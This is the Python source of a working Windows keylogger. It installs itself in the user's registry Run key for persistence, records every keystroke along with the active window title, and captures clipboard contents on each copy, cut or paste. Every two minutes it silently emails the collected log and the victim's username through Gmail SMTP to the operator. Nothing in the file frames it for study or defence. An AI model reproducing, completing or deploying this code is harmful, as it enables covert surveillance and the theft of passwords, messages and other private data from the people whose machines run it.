from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
import os
import sys
import winreg
import unicodedata
import threading
from datetime import datetime
import keyboard
import pyperclip
import win32gui
from pynput import keyboard as kb
from pynput.keyboard import Key

current_window = None
REPORT_INTERVAL = 120
SENDER_EMAIL = "YOUR_GMAIL"
SENDER_PASSWORD = "YOUR_PASSWORD"
RECEIVER_EMAIL = [SENDER_EMAIL]
special_keys = {
    Key.alt_l: "",
    Key.alt_r: "",
    Key.backspace: " [Backspace] ",
    Key.caps_lock: "",
    Key.cmd_l: " [Windows Key] ",
    Key.ctrl_l: "",
    Key.ctrl_r: "",
    Key.delete: " [Delete] ",
    Key.down: " [Down] ",
    Key.end: "",
    Key.enter: "\n",
    Key.esc: " [Esc] ",
    Key.f1: " [F1] ",
    Key.f10: " [F10] ",
    Key.f11: " [F11] ",
    Key.f2: " [F2] ",
    Key.f3: " [F3] ",
    Key.f4: " [F4] ",
    Key.f5: " [F5] ",
    Key.f6: " [F6] ",
    Key.f7: " [F7] ",
    Key.f8: " [F8] ",
    Key.f9: " [F9] ",
    Key.home: "",
    Key.insert: "",
    Key.left: " [Left] ",
    Key.num_lock: "",
    Key.page_down: "",
    Key.page_up: "",
    Key.pause: "",
    Key.print_screen: " [Print Screen] ",
    Key.right: " [Right] ",
    Key.scroll_lock: "",
    Key.shift_l: "",
    Key.shift_r: "",
    Key.space: " ",
    Key.tab: " [Tab] ",
    Key.up: " [Up] ",
    Key.media_volume_up: " [Volume Up] ",
    Key.media_volume_down: " [Volume Down] ",
    Key.media_volume_mute: " [Mute] ",
    Key.media_next: " [Next Track] ",
    Key.media_previous: " [Previous Track] ",
    Key.media_play_pause: " [Play/Pause] ",
}

log = ""
start_time = ""
end_time = ""
username = os.getlogin()


def add_to_registry():
    exe_path = os.path.abspath(sys.executable)
    key_name = "memelogger"
    reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_ALL_ACCESS
        ) as reg_key:
            try:
                existing_value, _ = winreg.QueryValueEx(reg_key, key_name)
                if existing_value == exe_path:
                    return
            except FileNotFoundError:
                pass
            winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, exe_path)
    except Exception:
        return


def get_active_window():
    try:
        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
    except Exception:
        return "Unknown Window"


def log_window_change():
    global current_window
    new_window = get_active_window()
    if new_window != current_window and new_window.strip():
        current_window = new_window
        global log
        log += f"\n{'=' * 50}\nWindow title: {current_window}\n"


def on_press(key):
    log_window_change()
    global log
    try:
        if key in special_keys:
            log += special_keys[key]
        elif key is None:
            log += "\n[Error]: Key press event was None\n"
        else:
            char = key.char
            try:
                unicodedata.name(char)
                log += unicodedata.normalize("NFC", char)
            except (ValueError, AttributeError):
                log += f"\n[Unknown Key]:'{str(key)}'\n"
    except AttributeError:
        log += str(key)


def copy_clipboard_data():
    global log
    log_window_change()
    log += f"\n[Clipboard]: {{\n{pyperclip.paste()}\n}}\n"


def send_log_via_email():
    global log, username, end_time

    msg = MIMEMultipart()
    msg["From"] = SENDER_EMAIL
    msg["To"] = RECEIVER_EMAIL
    msg["Subject"] = f"Keylog Report - {username} - {end_time}"

    body = f"Username: {username}\nTime: {end_time}\n\n{log}"
    msg.attach(MIMEText(body, "plain"))
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.send_message(msg)
        server.quit()
    except Exception:
        pass


def schedule_report():
    global log, username, end_time
    if log:
        send_log_via_email()
    log = ""
    timer = threading.Timer(interval=REPORT_INTERVAL, function=schedule_report)
    timer.daemon = True
    timer.start()


if __name__ == "__main__":
    add_to_registry()
    start_time = datetime.now()
    keyboard.add_hotkey("ctrl+v", copy_clipboard_data, suppress=False)
    keyboard.add_hotkey("ctrl+c", copy_clipboard_data, suppress=False)
    keyboard.add_hotkey("ctrl+x", copy_clipboard_data, suppress=False)
    with kb.Listener(on_press=on_press) as listener:
        schedule_report()
        listener.join()
